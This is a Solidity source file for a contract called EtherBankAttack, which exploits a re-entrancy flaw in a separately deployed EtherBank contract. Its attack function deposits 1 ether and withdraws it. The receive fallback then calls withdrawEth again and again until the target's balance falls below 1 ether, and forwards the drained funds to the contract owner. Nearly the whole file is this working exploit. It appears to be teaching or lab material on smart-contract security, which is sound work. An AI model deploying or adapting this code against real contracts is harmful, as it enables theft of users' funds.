// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

interface EtherBank {
    function depositEth() external payable;
    function withdrawEth() external payable;
}

contract EtherBankAttack {
    // wrap EtherBank Interface into a variable
    EtherBank private immutable etherBank;
    address private immutable owner;

    // Set owner of EtherBankAttack
    // Assign the address of an already deployed EtherBank Contract.

    constructor(address _etherBankAddress) {
        owner = msg.sender;
        etherBank = EtherBank(_etherBankAddress);
    }

    // Time to attack the etherBank contract using re-entrancy
    function attack() external payable {
        etherBank.depositEth{value: 1 ether}();
        etherBank.withdrawEth();
    }

    receive() external payable {
        if (address(etherBank).balance >= 1 ether) {
            etherBank.withdrawEth();
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }

    function getOwner() public view returns (address) {
        return owner;
    }

    function getAttackContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
